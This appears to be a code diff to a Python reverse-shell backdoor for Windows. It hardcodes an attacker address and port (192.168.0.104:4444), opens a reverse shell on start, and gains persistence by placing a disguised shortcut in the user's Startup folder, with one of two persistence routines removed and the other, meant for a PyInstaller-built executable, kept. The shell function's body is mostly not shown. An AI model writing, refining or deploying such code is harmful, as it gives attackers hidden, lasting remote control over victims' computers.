@@ -6,11 +6,9 @@ import sys
 import os
 import base64
 import shutil
-from pathlib import Path
-from win32com.client import Dispatch
 
-LHOST = os.environ.get("LHOST") or "192.168.0.104"
-LPORT = int(os.environ.get("LPORT") or "4444")
+LHOST = "192.168.0.104"
+LPORT = int("4444")
 
 if len(sys.argv) == 3:
     LHOST = sys.argv[1]
@@ -68,8 +66,7 @@ def reverse_shell(host: str, port: int):
         sock.close()
 
 
-# For PyInstaller
-def add_to_startup_py_installer():
+def add_to_startup():
     if not getattr(sys, "frozen", False):
         raise RuntimeError("Цей код потрібно запускати із зібраного PyInstaller .exe")
 
@@ -90,28 +87,8 @@ def add_to_startup_py_installer():
     shortcut.Save()
     
 
-def add_to_startup_native():
-    startup = os.path.join(
-        os.environ["APPDATA"],
-        r"Microsoft\Windows\Start Menu\Programs\Startup"
-    )
-
-    python_exe = sys.executable
-    script = str(Path(__file__).resolve())
-
-    shortcut_path = os.path.join(startup, "MyApp.lnk")
-
-    shell = Dispatch("WScript.Shell")
-    shortcut = shell.CreateShortCut(shortcut_path)
-    shortcut.TargetPath = python_exe
-    shortcut.Arguments = f'"{script}"'
-    shortcut.WorkingDirectory = str(Path(script).parent)
-    shortcut.IconLocation = python_exe
-    shortcut.Save()
-
-
 if __name__ == "__main__":
     reverse_shell(LHOST, LPORT)
-    add_to_startup_native()
+    add_to_startup()
 
     
